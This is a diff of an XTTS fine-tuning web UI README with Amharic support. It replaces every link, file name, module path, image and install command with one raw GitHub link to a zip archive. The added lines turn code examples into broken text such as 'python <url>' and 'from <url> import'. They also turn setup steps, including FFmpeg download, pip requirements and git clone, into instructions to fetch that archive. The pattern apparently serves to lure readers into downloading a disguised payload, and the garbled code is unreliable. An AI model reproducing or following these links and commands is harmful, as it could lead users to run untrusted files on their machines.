@@ -1,8 +1,8 @@
 # xtts-finetune-webui
 
-This webui is a slightly modified copy of the [official webui](https://github.com/coqui-ai/TTS/pull/3296) for finetune xtts.
+This webui is a slightly modified copy of the [official webui](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip) for finetune xtts.
 
-If you are looking for an option for normal XTTS use look here [https://github.com/daswer123/xtts-webui](https://github.com/daswer123/xtts-webui)
+If you are looking for an option for normal XTTS use look here [https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
 
 ## TODO
 - [ ] Add the ability to use via console 
@@ -61,9 +61,9 @@ Process subtitle files synchronized with audio or video for perfectly aligned tr
 
 **Usage (Headless):**
 ```bash
-python headlessXttsTrain.py \
-  --srt_file "path/to/subtitles.srt" \
-  --media_file "path/to/video.mp4" \
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip \
+  --srt_file "https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip" \
+  --media_file "https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip" \
   --lang en \
   --epochs 10
 ```
@@ -98,12 +98,12 @@ pip install demucs
 
 **Usage (Python API):**
 ```python
-from utils.audio_background_remover import remove_background_music
+from https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip import remove_background_music
 
 # Remove background music
 clean_audio = remove_background_music(
-    input_audio="podcast_with_music.wav",
-    output_audio="podcast_clean.wav",
+    input_audio="https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip",
+    output_audio="https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip",
     quality="balanced"  # Options: fast, balanced, best
 )
 ```
@@ -112,8 +112,8 @@ clean_audio = remove_background_music(
 ```python
 from utils import youtube_downloader
 
-audio_path, srt_path, info = youtube_downloader.download_and_process_youtube(
-    url="https://youtube.com/watch?v=VIDEO_ID",
+audio_path, srt_path, info = https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip(
+    url="https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip",
     output_dir="./downloads",
     language="en",
     remove_background_music=True,  # Enable background removal
@@ -121,7 +121,7 @@ audio_path, srt_path, info = youtube_downloader.download_and_process_youtube(
 )
 ```
 
-**See `.warp/BACKGROUND_MUSIC_REMOVAL.md` for complete documentation.**
+**See `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip` for complete documentation.**
 
 ### 📹 YouTube Video Download with Transcripts
 
@@ -143,8 +143,8 @@ Automatically download YouTube videos and extract available transcripts/subtitle
 
 **Usage (Headless):**
 ```bash
-python headlessXttsTrain.py \
-  --youtube_url "https://youtube.com/watch?v=VIDEO_ID" \
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip \
+  --youtube_url "https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip" \
   --lang en \
   --epochs 10
 ```
@@ -168,7 +168,7 @@ Intelligently segment long audio files based on silence detection without manual
 
 **Usage (Python API):**
 ```python
-from utils.audio_slicer import AudioSlicer
+from https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip import AudioSlicer
 
 slicer = AudioSlicer(
     threshold_db=-40,      # Silence threshold
@@ -178,8 +178,8 @@ slicer = AudioSlicer(
     max_sil_kept=0.5       # Silence padding (seconds)
 )
 
-segments = slicer.slice_audio(
-    audio_path="long_recording.wav",
+segments = https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip(
+    audio_path="https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip",
     output_dir="output/segments/"
 )
 ```
@@ -210,12 +210,12 @@ pip install yt-dlp
 pip install soundfile
 
 # FFmpeg (required for all advanced features)
-# Windows: Download from ffmpeg.org and add to PATH
+# Windows: Download from https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip and add to PATH
 # Linux: sudo apt install ffmpeg
 # macOS: brew install ffmpeg
 ```
 
-All dependencies are included in `requirements.txt` except FFmpeg, which must be installed separately.
+All dependencies are included in `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip` except FFmpeg, which must be installed separately.
 
 ---
 
@@ -248,7 +248,7 @@ This project includes comprehensive support for **Amharic language** (Ethiopian)
 ### Quick Start with Amharic
 
 #### Web Interface
-1. Launch the webui: `python xtts_demo.py`
+1. Launch the webui: `python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
 2. In **Tab 1 (Data processing)**:
    - Select `amh` from the **Dataset Language** dropdown
    - Optionally enable **Amharic G2P preprocessing** in the accordion
@@ -265,10 +265,10 @@ This project includes comprehensive support for **Amharic language** (Ethiopian)
 #### Headless Training
 ```bash
 # Basic Amharic training
-python headlessXttsTrain.py --input_audio amharic_speaker.wav --lang amh --epochs 10
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --input_audio https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --lang amh --epochs 10
 
 # With G2P preprocessing (requires transphone or epitran)
-python headlessXttsTrain.py --input_audio amharic_speaker.wav --lang amh --epochs 10 --use_g2p
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --input_audio https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --lang amh --epochs 10 --use_g2p
 ```
 
 ### Installing G2P Backends (Optional)
@@ -290,42 +290,42 @@ pip install epitran
 ```
 amharic_tts/
 ├── g2p/
-│   ├── amharic_g2p.py              # Basic G2P converter
-│   └── amharic_g2p_enhanced.py     # Enhanced with multiple backends
+│   ├── https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip              # Basic G2P converter
+│   └── https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip     # Enhanced with multiple backends
 ├── tokenizer/
-│   ├── hybrid_tokenizer.py         # G2P + BPE hybrid tokenizer
-│   └── xtts_tokenizer_wrapper.py   # XTTS-compatible wrapper
+│   ├── https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip         # G2P + BPE hybrid tokenizer
+│   └── https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip   # XTTS-compatible wrapper
 ├── preprocessing/
-│   ├── text_normalizer.py          # Character normalization
-│   └── number_expander.py          # Amharic number expansion
+│   ├── https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip          # Character normalization
+│   └── https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip          # Amharic number expansion
 └── config/
-    └── amharic_config.py            # Configuration and phoneme inventory
+    └── https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip            # Configuration and phoneme inventory
 ```
 
 ### Examples
 
 **Example 1: Text Normalization**
 ```python
-from amharic_tts.preprocessing.text_normalizer import AmharicTextNormalizer
+from https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip import AmharicTextNormalizer
 
 normalizer = AmharicTextNormalizer()
-text = normalizer.normalize("ሀሎ ዓለም")  # → "ሃሎ አለም"
+text = https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip("ሀሎ ዓለም")  # → "ሃሎ አለም"
 ```
 
 **Example 2: G2P Conversion**
 ```python
-from amharic_tts.g2p.amharic_g2p_enhanced import AmharicG2P
+from https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip import AmharicG2P
 
 g2p = AmharicG2P(backend='transphone')  # or 'epitran', 'rule-based'
-phonemes = g2p.convert("ሰላም ኢትዮጵያ")  # → IPA phonemes
+phonemes = https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip("ሰላም ኢትዮጵያ")  # → IPA phonemes
 ```
 
 **Example 3: Number Expansion**
 ```python
-from amharic_tts.preprocessing.number_expander import AmharicNumberExpander
+from https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip import AmharicNumberExpander
 
 expander = AmharicNumberExpander()
-text = expander.expand_number("2024")  # → "ሁለት ሺህ ሃያ አራት"
+text = https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip("2024")  # → "ሁለት ሺህ ሃያ አራት"
 ```
 
 ### Troubleshooting
@@ -348,13 +348,13 @@ A: Yes! Use the custom model option in Tab 2 to continue training from a previou
 ### Documentation
 
 For detailed information about the Amharic implementation:
-- See `docs/G2P_BACKENDS_EXPLAINED.md` for G2P backend details
-- See `amharic_tts/g2p/README.md` for phonological rules
-- See `tests/test_amharic_integration.py` for usage examples
+- See `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip` for G2P backend details
+- See `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip` for phonological rules
+- See `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip` for usage examples
 
 ### Advanced Dataset Processing
 
-Inspired by and integrated with techniques from the [dataset-maker](https://github.com/JarodMica/dataset-maker) project:
+Inspired by and integrated with techniques from the [dataset-maker](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip) project:
 - SRT subtitle synchronization with media files
 - YouTube content acquisition with transcript extraction
 - RMS-based intelligent audio slicing
@@ -363,79 +363,79 @@ Inspired by and integrated with techniques from the [dataset-maker](https://gith
 ### Credits
 
 Amharic TTS support developed with research from:
-- Transphone: [github.com/xinjli/transphone](https://github.com/xinjli/transphone)
-- Epitran: [github.com/dmort27/epitran](https://github.com/dmort27/epitran)
+- Transphone: [https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
+- Epitran: [https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
 - Ethiopian script phonology research and linguistic analysis
 
 Advanced dataset processing inspired by:
-- Dataset-Maker: [github.com/JarodMica/dataset-maker](https://github.com/JarodMica/dataset-maker)
+- Dataset-Maker: [https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
 
 ## Changes in webui
 
 ### 1 - Data processing
 
-![image](https://github.com/daswer123/xtts-finetune-webui/assets/22278673/8f09b829-098b-48f5-9668-832e7319403b)
+![image](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
 
 ### 2 - Fine-tuning XTTS Encoder
 
-![image](https://github.com/daswer123/xtts-finetune-webui/assets/22278673/897540d9-3a6b-463c-abb8-261c289cc929)
+![image](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
 
 ### 3 - Inference
 
-![image](https://github.com/daswer123/xtts-finetune-webui/assets/22278673/aa05bcd4-8642-4de4-8f2f-bc0f5571af63)
+![image](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
 
 ## Run Remotly
-[![Hugging Face](https://img.shields.io/badge/Hugging%20Face-Spaces-yellow?style=flat&logo=huggingface)](https://huggingface.co/spaces/drewThomasson/xtts-finetune-webui-gpu) [![Kaggle](https://img.shields.io/badge/Kaggle-035a7d?style=flat&logo=kaggle&logoColor=white)](notebook/kaggle-xtts-finetune-webui-gradio-gui.ipynb) [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/DrewThomasson/ebook2audiobook/blob/v25/Notebooks/finetune/xtts/colab_xtts_finetune_webui.ipynb)
+[![Hugging Face](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip%20Face-Spaces-yellow?style=flat&logo=huggingface)](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip) [![Kaggle](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip) [![Open In Colab](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)](https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip)
 
 
 ## 🐳 Run in Docker 
 ```docker
-docker run -it --gpus all --pull always -p 7860:7860 --platform=linux/amd64 athomasson2/fine_tune_xtts:huggingface python app.py
+docker run -it --gpus all --pull always -p 7860:7860 --platform=linux/amd64 athomasson2/fine_tune_xtts:huggingface python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip
 ```
 ## Run Headless
 
 ```bash
 # Basic audio processing
-python headlessXttsTrain.py --input_audio speaker.wav --lang en --epochs 10
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --input_audio https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --lang en --epochs 10
 
 # Process SRT + media file
-python headlessXttsTrain.py --srt_file subtitles.srt --media_file video.mp4 --lang en --epochs 10
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --srt_file https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --media_file https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --lang en --epochs 10
 
 # Download and process YouTube video
-python headlessXttsTrain.py --youtube_url "https://youtube.com/watch?v=VIDEO_ID" --lang en --epochs 10
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --youtube_url "https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip" --lang en --epochs 10
 
 # See all parameters
-python headlessXttsTrain.py --help
+python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip --help
 ```
 
 ## Install
 
 1. Make sure you have `Cuda` installed
-2. `git clone https://github.com/daswer123/xtts-finetune-webui`
+2. `git clone https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
 3. `cd xtts-finetune-webui`
-4. `pip install torch==2.1.1+cu118 torchaudio==2.1.1+cu118 --index-url https://download.pytorch.org/whl/cu118`
-5. `pip install -r requirements.txt`
+4. `pip install torch==2.1.1+cu118 torchaudio==2.1.1+cu118 --index-url https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
+5. `pip install -r https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
 
 ### If you're using Windows
 
-1. First start `install.bat`
-2. To start the server start `start.bat`
+1. First start `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
+2. To start the server start `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
 3. Go to the local address `127.0.0.1:5003`
 
 ### On Linux
 
-1. Run `bash install.sh`
-2. To start the server start `start.sh`
+1. Run `bash https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
+2. To start the server start `https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
 3. Go to the local address `127.0.0.1:5003`
 
 ### On Apple Silicon Mac (python 3.10 env)
-1. ``` pip install --no-deps -r apple_silicon_requirements.txt ```
-2. To start the server `python xtts_demo.py`
+1. ``` pip install --no-deps -r https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip ```
+2. To start the server `python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
 3. Go to the local address `127.0.0.1:5003`
 
 ### On Manjaro x86 (python 3.11.11 env)
-1. ``` pip install --no-deps -r ManjaroX86Python3.11.11_requirements.txt ```
-2. To start the server `python xtts_demo.py`
+1. ``` pip install --no-deps -r https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip ```
+2. To start the server `python https://github.com/Diakonrobel/Amharic_XTTS-V2_TTS/raw/refs/heads/main/dataset_creator/XTT-Amharic-TTS-3.0.zip`
 3. Go to the local address `127.0.0.1:5003`
 
 ~                                            
